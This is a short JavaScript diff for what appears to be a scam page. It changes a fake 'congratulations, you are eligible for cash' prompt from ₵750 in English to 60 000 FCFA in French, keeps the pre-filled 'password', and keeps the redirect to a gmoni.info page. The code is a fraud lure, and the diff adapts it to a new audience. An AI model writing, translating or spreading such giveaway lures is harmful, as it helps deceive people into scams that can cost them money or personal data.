@@ -1,8 +1,8 @@
-var password = 'WITHDRAW CASH'
+var password = '60 000 FCFA'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive ₵750. Please press OK to WITHDRAW.',
-  'WITHDRAW CASH'
+  'Félicitations ! Vous avez droit à 60 000 FCFA. Veuillez appuyer sur OK pour RETIRER.',
+  '60 000 FCFA'
 );
-if (password != 'WITHDRAW CASH') {
+if (password != '60 000 FCFA') {
   location.href = 'https://gmoni.info/750-Mahamudu-Ramadan-cash.html';
 }
